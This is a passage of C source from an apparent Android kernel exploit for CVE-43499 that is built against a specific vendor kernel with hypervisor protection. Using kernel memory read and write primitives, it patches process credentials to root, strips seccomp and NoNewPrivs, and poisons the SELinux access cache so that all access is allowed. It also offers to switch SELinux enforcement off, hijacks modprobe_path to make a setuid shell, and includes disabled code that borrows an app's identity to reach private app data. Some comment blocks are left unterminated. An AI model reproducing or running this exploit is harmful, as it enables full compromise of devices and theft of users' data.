 * the cred object, so the child already sees uid 0 when it execs; execve gives
 * the child its own cred, so the parent can restore the original uid/caps
 * afterwards and stay eligible to fork again for the next request.
 */
/*
 * HKIP continuation, 2026-11-14: hkip_check_uid_root()/hkip_check_xid_root()
 * end their failure path in `printk(...); brk #0x800`, i.e. a deliberate kernel
 * BUG, not an error return.  So a uid-0 task can only survive if the check
 * takes its success path, and there are exactly two: task->pid == 0, or the
 * task's pid bit set in hkip_uid_root_bits / hkip_gid_root_bits (byte = pid>>3,
 * bit = pid&7, pids >= 0x8000 skip the lookup).  This marks the bit; the pid
 * used here must be the real pid of the task whose cred is patched.
 */
/*
 * Register EVERY thread of a target process with EL2 before its creds are
 * touched.
 *
 * Measured twice (g2/g3): marking only one byte (8 pids) and then patching the
 * cred of a *live Android app* rebooted the device.  A Linux cred is shared by
 * all threads of a process, so uid 0 becomes visible to every thread at once,
 * but hkip_check_xid_root() looks up the CURRENT thread's tid -- and the app's
 * binder/worker tids are scattered far outside the target's byte.  Each such
 * thread is then "uid 0 without a bit", i.e. the reset path.
 *
 * So: walk /proc/<tgid>/task, mark one EL2 byte per distinct byte index.  The
 * write itself must be an HVC; an EL1 store into the bitmap is silently
 * dropped because EL2 owns those pages (ROWM).
 */
/*
 * Seccomp / NoNewPrivs release for the task that is about to exec.
 * Recovered 2026-11-16: the original body was lost to a bad bulk deletion, and a
 * stub here would silently break uid-0 exec.  Offsets are from target.h and the
 * return contract matches what root() expects: all five conditions cleared.
 */
/*
 * avtab bucket hash (route A).  Exact port of probe/fit3.py, which was validated
 * 7/7 against real (bucket,key) samples measured on this device; the key trick is
 * that the ARM BFXIL Wd,Wn,#lsb,#width inserts the extracted field at the LOW end
 * of Wd.  avt_selftest() re-checks one of those samples at runtime, so a bad port
 * can never silently write into the wrong bucket.
 */
static uint32_t avt_ror(uint32_t x, int n) {
  return (x >> n) | (x << (32 - n));
}
static uint32_t avt_bfxil(uint32_t dst, uint32_t src, int lsb, int width) {
  uint32_t fm = (1u << width) - 1u;
  return (dst & ~fm) | ((src >> lsb) & fm);
}
static uint32_t avt_hash(uint32_t st, uint32_t tt, uint32_t tc) {
  const uint32_t c1 = 0xcc9e2d51u, c2 = 0x16a88000u, c3 = 0x1b873593u;
  const uint32_t c4 = 0xe6b26000u, c5 = 0xe6546b64u, c6 = 0x85ebca6bu;
  const uint32_t c7 = 0xc2b2ae35u;
  uint32_t w15 = tc * c1, w16 = tc * c2, w17 = tt * c1;
  w16 = avt_bfxil(w16, w15, 17, 15);
  w15 = tt * c2;
  w15 = avt_bfxil(w15, w17, 17, 15);
  uint32_t w12 = st * c1, w13 = st * c2;
  w13 = avt_bfxil(w13, w12, 17, 15);
  uint32_t t17 = w16 * c4, t16 = w16 * c3;
  t17 = avt_bfxil(t17, t16, 19, 13);
  t17 = t17 + (t17 << 2);
  t17 = t17 + c5;
  uint32_t t15 = w15 * c3;
  t15 = t17 ^ t15;
  t15 = avt_ror(t15, 19);
  t15 = t15 + (t15 << 2);
  uint32_t t13 = w13 * c3;
  t15 = t15 + c5;
  t13 = t15 ^ t13;
  t13 = avt_ror(t13, 19);
  t13 = t13 + (t13 << 2);
  uint32_t x = t13 + c5;
  x ^= x >> 16;
  x *= c6;
  x ^= x >> 13;
  x *= c7;
  x ^= x >> 16;
  return x;
}
/* Measured samples: these MUST hold before anything is written. */
static int avt_selftest(void) {
  static const uint32_t S[3][4] = {
      {311u, 3543u, 98u, 0u}, {1480u, 2122u, 8u, 1u}, {821u, 1680u, 14u, 2u}};
  for (int i = 0; i < 3; i++) {
    if ((avt_hash(S[i][0], S[i][1], S[i][2]) & 0x7fffu) != S[i][3]) {
      return 0;
    }
  }
  return 1;
}
/* avtab chain order is (src,tgt,cls) ascending; `<` on the packed 4x u16 key. */
static int avt_lt(uint64_t a, uint64_t b) {
  uint32_t sa = (uint32_t)(a & 0xffffu), ta = (uint32_t)((a >> 16) & 0xffffu);
  uint32_t ca = (uint32_t)((a >> 32) & 0xffffu);
  uint32_t sb = (uint32_t)(b & 0xffffu), tb = (uint32_t)((b >> 16) & 0xffffu);
  uint32_t cb = (uint32_t)((b >> 32) & 0xffffu);
  if (sa != sb) {
    return sa < sb;
  }
  if (ta != tb) {
    return ta < tb;
  }
  return ca < cb;
}
/*
 * Walk the three circular prmem lists of selinux_pool (sentinel == &pool) and
 * collect every (va_start,size) pair.  vmap_area_node = {next, va, va_start,
 * size}.  Only pairs that look like a 4K-aligned vmalloc range are kept: g58
 * proved that handing RO_MOD_UNREGISTER a guessed range resets the device.
 */
static int prmem_collect(int fd, uint64_t pool, uint64_t rgs[][2], int maxn) {
  int nr = 0;
  for (int li = 0; li < 3 && nr < maxn; li++) {
    uint64_t nd = root_read64(fd, (uintptr_t)pool + (uint32_t)(8 + li * 8));
    for (int k = 0; k < 64 && nr < maxn; k++) {
      if (nd < 0xffffff8000000000ULL || nd == pool) {
        break;
      }
      uint64_t q4[4] = {0, 0, 0, 0};
      if (kernel_read_data(fd, (uintptr_t)nd, q4, sizeof(q4)) !=
          (ssize_t)sizeof(q4)) {
        break;
      }
      if (q4[2] >= 0xffffff8000000000ULL && q4[3] > 0 &&
          (q4[2] & 0xfffULL) == 0 && q4[3] <= (64ULL << 20)) {
        rgs[nr][0] = q4[2];
        rgs[nr][1] = q4[3];
        nr++;
      }
      if (q4[0] == pool) {
        break;
      }
      nd = q4[0];
    }
  }
  return nr;
}


/*
 * prmem keeps its own VA range tree; `prmem_protect_addr` and `get_paddr` both
 * walk it via *(master_lock+0x18) (0xffffffc014372018).  Node layout, straight
 * from the disassembly: start @ node-0x10, end @ node-0x8, rb_right @ node+8,
 * rb_left @ node+0x10.  Registration granularity is the whole vmap area, so the
 * [start,end) found here is exactly the pair RO_MOD_UNREGISTER expects -- and
 * unlike vmap_area_list (in .bss) this root sits in .data and may be readable.
 */
static int prmem_area_of(int fd, uint64_t va, uint64_t* lo, uint64_t* hi) {
  uint64_t root =
      root_read64(fd, (uintptr_t)(KIMAGE_TEXT_BASE + 0x4372000ULL) + 0x18);
  for (int k = 0; k < 256 && root >= 0xffffffd000000000ULL; k++) {
    uint64_t f[2] = {0, 0};
    if (kernel_read_data(fd, (uintptr_t)(root - 0x10), f, sizeof(f)) !=
        (ssize_t)sizeof(f)) {
      return 0;
    }
    if (va >= f[0] && va < f[1]) {
      *lo = f[0];
      *hi = f[1];
      return 1;
    }
    uint64_t nx = 0;
    uint64_t child = root + (va < f[0] ? 0x10ULL : 0x8ULL);
    if (kernel_read_data(fd, (uintptr_t)child, &nx, 8) != 8) {
      return 0;
    }
    root = nx;
  }
  return 0;
}

static int patch_task_seccomp(int fd, uintptr_t task) {
  if (!is_direct_ptr(task)) {
    return 0;
  }
  uintptr_t flags_addr = task + TASK_THREAD_INFO_FLAGS_OFF;
  uintptr_t atomic_flags_addr = task + TASK_ATOMIC_FLAGS_OFF;
  uintptr_t seccomp_addr = task + TASK_SECCOMP_OFF;

  uint64_t flags_before = pipe_read64(fd, flags_addr);
  uint64_t atomic_before = pipe_read64(fd, atomic_flags_addr);
  uint32_t mode_before = pipe_read32(fd, seccomp_addr + SECCOMP_MODE_OFF);
  uint32_t count_before = pipe_read32(fd, seccomp_addr + SECCOMP_FILTER_COUNT_OFF);
  uint64_t filter_before = pipe_read64(fd, seccomp_addr + SECCOMP_FILTER_OFF);

  uint64_t flags_want = flags_before & ~(1ULL << TIF_SECCOMP_BIT);
  uint64_t atomic_want = atomic_before & ~(1ULL << PFA_NO_NEW_PRIVS_BIT);
  uint32_t zero32 = 0;
  uint64_t zero64 = 0;

  int ok = 1;
  if (flags_want != flags_before) {
    ok &= pipe_write64(fd, flags_addr, flags_want);
  }
  if (atomic_want != atomic_before) {
    ok &= pipe_write64(fd, atomic_flags_addr, atomic_want);
  }
  ok &= pipe_phys_write_data(fd, seccomp_addr + SECCOMP_MODE_OFF, &zero32,
                             sizeof(zero32));
  ok &= pipe_phys_write_data(fd, seccomp_addr + SECCOMP_FILTER_COUNT_OFF, &zero32,
                             sizeof(zero32));
  ok &= pipe_phys_write_data(fd, seccomp_addr + SECCOMP_FILTER_OFF, &zero64,
                             sizeof(zero64));

  uint64_t flags_after = pipe_read64(fd, flags_addr);
  uint64_t atomic_after = pipe_read64(fd, atomic_flags_addr);
  uint32_t mode_after = pipe_read32(fd, seccomp_addr + SECCOMP_MODE_OFF);
  uint32_t count_after = pipe_read32(fd, seccomp_addr + SECCOMP_FILTER_COUNT_OFF);
  uint64_t filter_after = pipe_read64(fd, seccomp_addr + SECCOMP_FILTER_OFF);

  int tif_clear = (flags_after & (1ULL << TIF_SECCOMP_BIT)) == 0;
  int nnp_clear = (atomic_after & (1ULL << PFA_NO_NEW_PRIVS_BIT)) == 0;
  pr_info("seccomp patch task=%016llx flags=%016llx->%016llx atomic=%016llx->%016llx "
          "mode=%u->%u count=%u->%u filter=%016llx->%016llx ok=%d\n",
          (unsigned long long)task, (unsigned long long)flags_before,
          (unsigned long long)flags_after, (unsigned long long)atomic_before,
          (unsigned long long)atomic_after, mode_before, mode_after, count_before,
          count_after, (unsigned long long)filter_before,
          (unsigned long long)filter_after, ok);
  return ok && tif_clear && nnp_clear && mode_after == 0 && count_after == 0 &&
         filter_after == 0;
}
#ifdef PSELECT_WAITER_LAYOUT_5_10
static int umh_write_file(const char *path, const void *data, size_t len, mode_t mode) {
  int fd = open(path, O_WRONLY | O_CREAT | O_TRUNC | O_CLOEXEC, mode);
  if (fd < 0) {
    return 0;
  }
  ssize_t n = write(fd, data, len);
  int saved = errno;
  close(fd);
  errno = saved;
  return n == (ssize_t)len;
}

static int install_modprobe_root(int fd) {
  const char *script_path = "/tmp/x";
  const char *suid_path = "/tmp/cve43499-suid";
  const char *trigger_path = "/tmp/cve43499-bad";
  const char *script =
      "#!/bin/sh\n"
      "/bin/busybox chown 0:0 /tmp/cve43499-suid\n"
      "/bin/busybox chmod 4755 /tmp/cve43499-suid\n";

  root_uid_before = getuid();
  unlink(script_path);
  unlink(suid_path);
  unlink(trigger_path);

  int src = open("/bin/busybox", O_RDONLY | O_CLOEXEC);
  if (src < 0) {
    pr_info("modprobe root missing busybox errno=%d\n", errno);
    return 0;
  }
  int dst = open(suid_path, O_WRONLY | O_CREAT | O_TRUNC | O_CLOEXEC, 0755);
  if (dst < 0) {
    close(src);
    pr_info("modprobe root create suid errno=%d\n", errno);
    return 0;
  }
  char buf[4096];
  for (;;) {
    ssize_t n = read(src, buf, sizeof(buf));
    if (n <= 0) {
      break;
    }
    if (write(dst, buf, (size_t)n) != n) {
      close(src);
      close(dst);
      pr_info("modprobe root copy busybox errno=%d\n", errno);
      return 0;
    }
  }
  close(src);
  close(dst);

  if (!umh_write_file(script_path, script, strlen(script), 0755)) {
    pr_info("modprobe root create script errno=%d\n", errno);
    return 0;
  }
  unsigned char magic[16];
  memset(magic, 0xff, sizeof(magic));
  if (!umh_write_file(trigger_path, magic, sizeof(magic), 0755)) {
    pr_info("modprobe root create trigger errno=%d\n", errno);
    return 0;
  }

  char before[8];
  char after[8];
  char path[8];
  memset(before, 0, sizeof(before));
  memset(after, 0, sizeof(after));
  memset(path, 0, sizeof(path));
  memcpy(path, script_path, strlen(script_path) + 1);
  ssize_t rd0 = configfs_read_once(
      fd, text_addr(MODPROBE_PATH), before, sizeof(before));
  ssize_t wr = configfs_write_once(
      fd, text_addr(MODPROBE_PATH), path, sizeof(path));
  ssize_t rd1 = configfs_read_once(
      fd, text_addr(MODPROBE_PATH), after, sizeof(after));
  pr_info("modprobe path rd0=%zd wr=%zd rd1=%zd before=%.8s after=%.8s dest=%s\n",
          rd0, wr, rd1, before, after, script_path);
  if (wr != (ssize_t)sizeof(path) ||
      memcmp(after, path, sizeof(path)) != 0) {
    return 0;
  }

  errno = 0;
  long sock = syscall(SYS_socket, 41, SOCK_STREAM, 0);
  pr_info("modprobe trigger socket ret=%ld errno=%d\n", sock, errno);
  if (sock >= 0) {
    close((int)sock);
  }
  pid_t helper = fork();
  if (helper == 0) {
    char *argv[] = {(char *)trigger_path, NULL};
    execve(trigger_path, argv, NULL);
    _exit(127);
  }
  if (helper > 0) {
    int st = 0;
    waitpid(helper, &st, 0);
  }
  usleep(500000);

  struct stat st;
  memset(&st, 0, sizeof(st));
  int st_ok = stat(suid_path, &st) == 0;
  pr_info("modprobe suid stat ok=%d uid=%u mode=%o\n",
          st_ok, (unsigned)st.st_uid, (unsigned)(st.st_mode & 07777));
  if (!st_ok || st.st_uid != 0 || (st.st_mode & 04000) == 0) {
    return 0;
  }

  pid_t child = fork();
  if (child == 0) {
    char *argv[] = {(char *)suid_path, (char *)"id", NULL};
    execve(suid_path, argv, NULL);
    _exit(127);
  }
  int status = 0;
  waitpid(child, &status, 0);

  root_uid_after = 0;
  root_child_done = 1;
  setuid_ret = 0;
  setgid_ret = 0;
  selinux_after = 0;
  pr_info("modprobe root done suid_uid=%u mode=%o wait=%d\n",
          (unsigned)st.st_uid, (unsigned)(st.st_mode & 07777), status);
  return 1;
}
#endif

/*
/*
 * SELinux bypass by AVC poisoning (HackTricks / Klecko; TASZK did the same on
 * Mate 40: "rewrote the AVC cache so the decisions will allow anything to
 * anybody -- this is not protected memory").
 *
 * avc_node is an ordinary slab object, NOT inside the HKIP PRMEM policy pool,
 * so it stays writable even though the policy is stage-2 read-only
 * (CONFIG_HKIP_SELINUX_PROT=y).  avc_has_perm() copies node->ae.avd.allowed
 * straight into the working decision, so forcing it to 0xffffffff makes every
 * cached (ssid,tsid,tclass) tuple allowed -- no kernel code execution needed.
 *
 * Addressing: measured on this device, data_addr() (the p0 physical alias) is
 * WRONG -- init_task.comm read as garbage through it, while configfs on
 * text_addr() returned exactly "swapper/".  So everything below uses configfs
 * on the KASLR image VA; __check_object_size only rejects kernel text/rodata,
 * which is why .data reads and non-linear writes are fine.
 *
 * Offsets verified against this image's avc_has_perm (0xffffffc0109bf778):
 *   ldr x0,[x24,#0x48] -> state->avc            (0x48)
 *   bl  avc_lookup
 *   ldr w8,[x0,#0x1c]  -> node->ae.avd.allowed  (0x1c)
 */
static int kread64(int fd, uintptr_t addr, uint64_t *out) {
  return kernel_read_data(fd, addr, out, sizeof(*out)) == (ssize_t)sizeof(*out);
}

static int kread32(int fd, uintptr_t addr, uint32_t *out) {
  return kernel_read_data(fd, addr, out, sizeof(*out)) == (ssize_t)sizeof(*out);
}

static int kwrite32(int fd, uintptr_t addr, uint32_t v) {
  return kernel_write_data(fd, addr, &v, sizeof(v)) == (ssize_t)sizeof(v);
}

/*
 * Fault-tolerant address check for the physical read primitive.
 *
 * is_direct_ptr() also accepts the kimage window (a 128 GB span), so an
 * unmapped-but-in-window value reaches direct_to_page(), which then computes a
 * wild struct page pointer and panics the kernel on dereference.  Structure
 * walks (the AVC hash table) must therefore restrict themselves to the real
 * linear map, where every address has a backing struct page.
 */
/* The project already ships a vetted AVC poison pass in fops.c (reads all 512
 * slot heads in one configfs read, walks whole chains, raises the threshold
 * through configfs).  Declared here so the request handler reuses it. */
int avc_poison_pass(int fd, const char *tag);

static int lin_ok(uint64_t v) {
  return v >= (uint64_t)DIRECT_MAP_BASE && v < (uint64_t)DIRECT_MAP_END &&
         (v & 7) == 0;
}


/*
 * TASZK §"SELinux bypass", stage A: rewrite the AVC cache so a decision becomes
 * allow.  Their wording: "I first rewrote the AVC cache so the decisions will
 * allow anything to anybody (this is not protected memory), then rewrote some
 * protected policy entries."
 *
 * avc_node objects are plain kmalloc (target.h: "NOT in the EL2-protected policy
 * pool"), so an EL1 write sticks -- unlike the HKIP bitmaps.  Stage B (patching
 * the avtab inside selinux_pool) is the part we cannot reach safely, so this
 * walks only the cache.
 *
 * Two deliberate differences from avc_poison():
 *   - every candidate address is checked with lin_ok() before ANY dereference,
 *     because a wild struct page panics the kernel (measured, §14);
 *   - only nodes whose ssid equals OUR sid are touched, and each write is read
 *     back, so a wrong offset cannot silently corrupt a foreign decision.
 */
/*
static const char* const g_probe_paths[3] = {
    "/data/local/tmp/l5r.log", "/data/system/packages.list",
    "/data/misc/wifi"};
static uint32_t g_avc_thr = 0;
static uint64_t g_avc_slot0 = 0;


/*
 * Read this process's own SELinux context string ("u:r:shell:s0" ...).
 * Only a *string* tells us which domain a numeric SID actually maps to;
 * the SID table is built at runtime, so the number alone is not evidence.
 *
 * The fd is opened ONCE, before any credential switch, and reused.  The
 * domain is resolved at read() time, so this still reports the
 * post-switch domain, and it keeps working even when the new domain has
 * no permission to open the attr file itself.  close/reopen would make
 * the measurement fail exactly in the case we care about.
 */
static int ctx_open(void) {
  return open("/proc/self/attr/current", O_RDONLY | O_CLOEXEC);
}

static int ctx_read(int fd, char *buf, size_t len) {
  if (fd < 0) {
    return -EBADF;
  }
  if (lseek(fd, 0, SEEK_SET) != 0) {
    return -errno;
  }
  ssize_t n = read(fd, buf, len - 1);
  if (n < 0) {
    return -errno;
  }
  buf[n] = '\0';
  for (ssize_t i = 0; i < n; i++) {
    if (buf[i] == '\n') {
      buf[i] = '\0';
    }
  }
  return (int)n;
}

#if 0 /* Frozen 2026-11-12.  c3/c35 landing proved the death is the PRIMITIVE,
/*
 * L5 probe that runs BEFORE the pipe stage.
 *
 * The pipe primitive is what actually kills runs: of the attempts that get past
 * the punch, nearly all die inside prepare_pipe_buffer_page_child().  L5 does not
 * need it -- misc.fops is hijacked by the CFI stage, so configfs read/write is
 * already live, and root_read_data now falls back to it for any address.
 *
 * This measures only the domain string, which is the whole of L5's claim: point
 * cred->security at pid 1's live blob, then read /proc/self/attr/current.  The
 * sysprop/mount probes stay in the later INIT_PROBE block because they need uid 0.
 *
 * selinux_cred_free() kfree()s whatever this pointer addresses, so the original
 * pointer is restored before returning; otherwise pid 1's blob would be freed
 * underneath init.
 */
int early_l5_probe(int fd) {
  cfg_fallback_enabled = 1;
  char c0[64] = {0}, c1[64] = {0};
  int afd = ctx_open();
  (void)ctx_read(afd, c0, sizeof(c0));
  pr_info("earlyL5 enter cfgfb=%d ctx='%s'\n", cfg_fallback_enabled, c0);

  {
    /* Can configfs reach a kimage address at all this early?  If this reads 0 or
     * garbage the walk below cannot work and L5 has to wait for the pipe stage,
     * where find_task_by_tgid is measured to succeed. */
    uintptr_t head = text_addr(INIT_TASK_TASKS);
    uint64_t nx = root_read64(fd, head);
    pr_info("earlyL5 head=%016llx next=%016llx direct=%d\n",
            (unsigned long long)head, (unsigned long long)nx,
            is_direct_ptr(nx));
  }
  uintptr_t it = find_task_by_tgid(fd, 1);
  pr_info("earlyL5 pid1 task=%016llx\n", (unsigned long long)it);
  uint64_t ic = is_direct_ptr(it) ? root_read64(fd, it + TASK_CRED_OFF) : 0;
  uint64_t isec =
      is_direct_ptr(ic) ? root_read64(fd, ic + CRED_SECURITY_OFF) : 0;
  pr_info("earlyL5 pid1 cred=%016llx sec=%016llx\n",
          (unsigned long long)ic, (unsigned long long)isec);

  uintptr_t ot = find_task_by_tgid(fd, (uint32_t)getpid());
  pr_info("earlyL5 own task=%016llx\n", (unsigned long long)ot);
  uint64_t oc = is_direct_ptr(ot) ? root_read64(fd, ot + TASK_CRED_OFF) : 0;
  uint64_t osec =
      is_direct_ptr(oc) ? root_read64(fd, oc + CRED_SECURITY_OFF) : 0;
  pr_info("earlyL5 pid1 t=%016llx c=%016llx s=%016llx | own t=%016llx "
          "c=%016llx s=%016llx ctx='%s'\n",
          (unsigned long long)it, (unsigned long long)ic,
          (unsigned long long)isec, (unsigned long long)ot,
          (unsigned long long)oc, (unsigned long long)osec, c0);

  if (is_direct_ptr(osec) && is_direct_ptr(isec) && osec != isec) {
    uintptr_t slot = oc + CRED_SECURITY_OFF;
    int w = root_write_data(fd, slot, &isec, sizeof(isec));
    (void)ctx_read(afd, c1, sizeof(c1));
    uint64_t rb = root_read64(fd, slot);
    pr_info("earlyL5 swap w=%d slot=%016llx rb=%016llx ctx='%s'\n", w,
            (unsigned long long)slot, (unsigned long long)rb, c1);
    root_write_data(fd, slot, &osec, sizeof(osec));
  } else {
    pr_info("earlyL5 skip isec=%016llx osec=%016llx oc=%016llx\n",
            (unsigned long long)isec, (unsigned long long)osec,
            (unsigned long long)oc);
  }
  if (afd >= 0) {
    close(afd);
  }
  cfg_fallback_enabled = 0;
  return 0;
}
#endif /* 0 -- early_l5_probe frozen */

int install_android_root(int fd) {
  /*
   * The child inherits this fd, so it can run avc_poison() itself.  Stored in a
   * global because spawn_root_child() takes no argument and the child needs the
   * physrw handle to flip the AVC cache.
   */
  g_kfd = fd;
  root_uid_before = getuid();
  if (!spawn_root_child()) {
    pr_info("root spawn failed child=%d\n", root_child_pid);
    return 0;
  }

#ifdef PSELECT_WAITER_LAYOUT_5_10
  uintptr_t selinux_addr = text_addr(SELINUX_ENFORCING);
  uintptr_t blob_sizes = text_addr(SELINUX_BLOB_SIZES);
  uintptr_t init_tasks = text_addr(INIT_TASK_TASKS);
  uintptr_t capable_head = text_addr(SECURITY_CAPABLE_HEAD);
#else
  uintptr_t selinux_addr = data_addr(SELINUX_ENFORCING);
  uintptr_t blob_sizes = data_addr(SELINUX_BLOB_SIZES);
  uintptr_t init_tasks = data_addr(INIT_TASK_TASKS);
  uintptr_t capable_head = data_addr(SECURITY_CAPABLE_HEAD);
#endif
  root_read_data(fd, selinux_addr, &selinux_before, sizeof(selinux_before));
  /*
   * Optional real SELinux disable.  The pselect path has only ever ASSIGNED
   * selinux_after = 0, so "SELinux is off" was never measured.  Writing
   * selinux_state.enforcing before the child is spawned is what decides
   * whether init may exec /data/local/tmp/su (the policy gives the execute
   * permission to the shell domain only), i.e. whether the su daemon can ever
   * start.  Off by default; enabled with CVE43499_SELINUX_OFF=1.
   */
  if (getenv("CVE43499_SELINUX_OFF")) {
    uint8_t zero = 0;
    uint8_t back = 0xff;
    int w = root_write_data(fd, selinux_addr, &zero, 1);
    (void)root_read_data(fd, selinux_addr, &back, 1);
    pr_info("selinux off w=%d after=%u addr=%016llx\n", w, back,
            (unsigned long long)selinux_addr);
  }
  selinux_cred_blob_off =
    root_read32(fd, blob_sizes);
  target_cred_osid = SELINUX_KERNEL_SID;
  target_cred_sid = SELINUX_KERNEL_SID;

  init_tasks_prev = root_read64(fd, init_tasks + 8);
  if (!is_direct_ptr(current_task_addr)) {
    current_task_addr = 0;
  }

  if (!is_direct_ptr(init_tasks_prev)) {
    pr_info("root bad init_tasks_prev=%016llx\n",
            (unsigned long long)init_tasks_prev);
    return 0;
  }
  current_task_addr = init_tasks_prev - TASK_TASKS_OFF;
  last_task_guess = current_task_addr;

#ifdef TASK_THREAD_PID_OFF
  {
    uint64_t thread_pid = root_read64(fd, current_task_addr + TASK_THREAD_PID_OFF);
    found_task_pid = 0;
    found_task_tgid = 0;
    if (is_direct_ptr(thread_pid)) {
      found_task_pid = root_read32(fd, thread_pid + PID_NR_OFF);
      found_task_tgid = found_task_pid;
    }
  }
#else
  found_task_pid = root_read32(fd, current_task_addr + TASK_PID_OFF);
  found_task_tgid = root_read32(fd, current_task_addr + TASK_TGID_OFF);
#endif
  memset(found_task_comm, 0, sizeof(found_task_comm));
  root_read_data(
      fd, current_task_addr + TASK_COMM_OFF, found_task_comm, TASK_COMM_LEN);
  /* "root task guess" print dropped 2026-11-12 for size; the walk result is
   * still reported by the "root patching task=" line below. */
  if (found_task_tgid != (uint32_t)root_child_pid) {
    current_task_addr = find_task_by_tgid(fd, (uint32_t)root_child_pid);
    if (!is_direct_ptr(current_task_addr)) {
      pr_info("root task walk failed want=%u iters=%d last=%016llx pid=%u tgid=%u\n",
              (uint32_t)root_child_pid, task_walk_iters,
              (unsigned long long)task_walk_last_entry, task_walk_last_pid,
              task_walk_last_tgid);
      return 0;
    }
  }
  pr_info("root patching task=%016llx pid=%u tgid=%u comm=%.16s\n",
          (unsigned long long)current_task_addr, found_task_pid,
          found_task_tgid, found_task_comm);

  uintptr_t real_cred_slot = current_task_addr + TASK_REAL_CRED_OFF;
  current_real_cred_addr = root_read64(fd, real_cred_slot);
  current_cred_addr = root_read64(fd, current_task_addr + TASK_CRED_OFF);
  uintptr_t cred_security_slot = current_cred_addr + CRED_SECURITY_OFF;
  uintptr_t real_security_slot = current_real_cred_addr + CRED_SECURITY_OFF;
  current_cred_security_addr = root_read64(fd, cred_security_slot);
  current_real_cred_security_addr = root_read64(fd, real_security_slot);
  uintptr_t sid_off = selinux_cred_blob_off + SELINUX_CRED_SID_OFF;
  if (is_direct_ptr(current_cred_security_addr)) {
    uintptr_t sid_addr = current_cred_security_addr + sid_off;
    cred_sid_before = root_read32(fd, sid_addr);
  }
  if (is_direct_ptr(current_real_cred_security_addr)) {
    uintptr_t sid_addr = current_real_cred_security_addr + sid_off;
    real_cred_sid_before = root_read32(fd, sid_addr);
  }
  uint64_t cred_caps_before[CRED_CAP_WORDS] = {0};
  uint64_t real_caps_before[CRED_CAP_WORDS] = {0};
  root_read_data(
      fd, current_cred_addr + CRED_CAPS_OFF, cred_caps_before,
      sizeof(cred_caps_before));
  root_read_data(
      fd, current_real_cred_addr + CRED_CAPS_OFF, real_caps_before,
      sizeof(real_caps_before));
#ifdef PSELECT_WAITER_LAYOUT_5_10
  /* Keep the original SELinux SID.  Kernel SID cannot exec
   * /system/bin/sh (AVC shell_exec).  uid=0 + shell SID is enough
   * once HKIP allowlists the pid. */
  if (!patch_cred_identity(fd, current_cred_addr)) {
    pr_info("root patch cred failed cred=%016llx\n",
            (unsigned long long)current_cred_addr);
    return 0;
  }
  if (current_real_cred_addr != current_cred_addr &&
      !patch_cred_identity(fd, current_real_cred_addr)) {
    pr_info("root patch real_cred failed real=%016llx\n",
            (unsigned long long)current_real_cred_addr);
    return 0;
  }
#else
  if (!patch_cred_object(fd, current_cred_addr)) {
    pr_info("root patch cred failed cred=%016llx\n",
            (unsigned long long)current_cred_addr);
    return 0;
  }
  if (current_real_cred_addr != current_cred_addr &&
      !patch_cred_object(fd, current_real_cred_addr)) {
    pr_info("root patch real_cred failed real=%016llx\n",
            (unsigned long long)cself);
    return 0;
  }
#endif

  /*
   * Route ② (borrow an app's SELinux identity) is disabled below.  It is
   * measured, not merely suspected:
   *   * writing {osid,sid} into cred->security really lands -- readback matches
   *     (`initdom ... now=70 w=1`, ROUND_INITDOM_2026-11-11.md §0.1) -- so the
   *     `now=` question this route existed to settle is answered;
   *   * /data/user/0 carries the MLS category on the directory itself
   *     (u:object_r:system_data_file:s0:c512,c768), so no borrowed *domain* and
   *     no uid/gid combination can satisfy `(dom l1 l2)`.  Only that exact app's
   *     own SID can, which is what this block implements -- and it is not the
   *     current goal (usable root / Magisk).
   * It also occupies ~1.3 KB of the 161144-byte budget the punch needs.  Kept
   * for reference: delete the #if 0 / #endif pair to re-enable.
   */
#if 0
  /*
   * Borrow an app's SELinux identity, then test access in-process.
   *
   * Per-app isolation on /data/data is an MLS constraint (app data sits at
   * s0:c512,c768), which no s0 domain can satisfy -- shell, system and init are
   * all s0 -- so borrowing a *domain* does not help.  The app's own SID carries
   * the right level.  cred->security is plain kmalloc on this device
   * (CONFIG_HKIP_PROTECT_CRED is off), so this is an ordinary data write.
   *
   * The path is read with a relative open, i.e. NOT via execve: exec re-derives
   * the SID from the policy and would prove nothing.
   */
  {
    const char *app = getenv("BORROW_APP");
    if (app && *app) {
      /* /proc/<pid>/comm is truncated to 15 chars, so match on the truncated
       * package name -- matching the last dotted component alone ("mm") would hit
       * almost every process. */
      char comm[16];
      snprintf(comm, sizeof(comm), "%s", app);
      uint32_t bosid = 0, bsid = 0, sosid = 0, ssid = 0, auid = 0, agid = 0;
      int bpid = 0;
      DIR *pd = opendir("/proc");
      if (pd) {
        struct dirent *de;
        while ((de = readdir(pd)) != NULL && bpid == 0) {
          if (de->d_name[0] < '0' || de->d_name[0] > '9') {
            continue;
          }
          char cp[64];
          char cb[64] = {0};
          snprintf(cp, sizeof(cp), "/proc/%s/comm", de->d_name);
          int cf = open(cp, O_RDONLY | O_CLOEXEC);
          if (cf < 0) {
            continue;
          }
          ssize_t cn = read(cf, cb, sizeof(cb) - 1);
          close(cf);
          if (cn > 0 && strstr(cb, comm) != NULL) {
            bpid = atoi(de->d_name);
          }
        }
        closedir(pd);
      }
      if (bpid > 0) {
        uint64_t t = find_task_by_tgid(fd, (uint32_t)bpid);
        uint64_t c = is_direct_ptr(t) ? pipe_read64(fd, t + TASK_CRED_OFF) : 0;
        uint64_t sec =
            is_direct_ptr(c) ? pipe_read64(fd, c + CRED_SECURITY_OFF) : 0;
        if (is_direct_ptr(sec)) {
          uintptr_t b = sec + SELINUX_CRED_BLOB_OFF;
          bosid = root_read32(fd, b + SELINUX_CRED_OSID_OFF);
          bsid = root_read32(fd, b + SELINUX_CRED_SID_OFF);
          auid = root_read32(fd, c + CRED_UID_OFF);
          agid = root_read32(fd, c + CRED_UID_OFF + 4);
        }
      }
      uint64_t own = pipe_read64(fd, current_cred_addr + CRED_SECURITY_OFF);
      if (is_direct_ptr(own)) {
        uintptr_t ob = own + SELINUX_CRED_BLOB_OFF;
        sosid = root_read32(fd, ob + SELINUX_CRED_OSID_OFF);
        ssid = root_read32(fd, ob + SELINUX_CRED_SID_OFF);
      }
      pr_info("borrow app=%s comm=%s pid=%d osid=%u sid=%u own=%u/%u\n", app,
              comm, bpid, bosid, bsid, sosid, ssid);
      if (bsid != 0 && auid != 0) {
        /*
         * Borrow the app's identity completely -- uid/gid as well as the SID.
         * As uid 0 the 0700 app directory needs CAP_DAC_OVERRIDE, which HKIP
         * blocks even for pid 0 (see the note at the ids[] definition); with the
         * app's own uid the owner check passes with no capability at all, so the
         * only remaining gate is SELinux.  This is the actual test.
         */
        uintptr_t ids_addr = current_cred_addr + CRED_UID_OFF;
        uint32_t saved_ids[8], app_ids[8];
